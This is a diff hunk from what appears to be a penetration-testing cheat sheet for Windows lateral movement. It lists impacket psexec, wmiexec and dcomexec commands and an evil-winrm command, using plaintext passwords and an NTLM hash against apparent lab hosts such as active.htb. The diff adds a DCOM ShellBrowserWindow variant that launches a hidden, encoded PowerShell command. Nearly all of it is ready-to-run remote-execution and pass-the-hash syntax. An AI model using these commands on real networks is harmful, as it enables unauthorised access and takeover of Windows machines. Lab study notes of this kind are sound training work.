@@ -528,11 +528,9 @@ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 # wmiexec
 impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 # dcomexec
-impacket-dcomexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
 impacket-dcomexec -object ShellWindows active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand -no-output
-
--object ShellBrowserWindow 
+impacket-dcomexec -object ShellBrowserWindow active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
 
 # evil-winrm
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
